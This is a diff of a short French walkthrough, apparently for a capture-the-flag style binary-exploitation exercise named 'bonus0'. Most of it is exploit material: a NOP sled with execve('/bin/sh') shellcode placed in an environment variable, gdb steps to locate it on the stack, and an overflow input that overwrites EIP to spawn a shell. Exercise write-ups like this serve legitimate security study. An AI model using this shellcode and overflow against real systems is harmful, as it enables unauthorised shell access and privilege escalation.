@@ -1,7 +1,23 @@
+Etape 1:
+env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb bonus0
 
+Etape 2:
+(gdb) b main
+Breakpoint 1 at 0x80485a7
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
 
-Adresse /biin/sh : 0xb7f8cc58
+Breakpoint 1, 0x080485a7 in main ()
 
-\x58\xcc\xf8\xb7
+(gdb) x/500s $esp
+//Trouver le payload dans la stack et recuperer une adresse en milieu de payload//
+[...]
+0xbffffe56:	 "\220\220\220\220...
+[...]
 
-python -c 'print "AAAAAA"'; python -c 'print "AAAAAA"' | ./bonus0
+Etape 3:
+Creation du bufferoverflow a partir des deux input pour remplacer EIP par l'adresse du payload
+python -c 'print "A"*4095 + "\n" + "B"*9 + "\x56\xfe\xff\xbf" + "\x90" * 64' > /tmp/exploit
+
+Etape 4:
+cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0
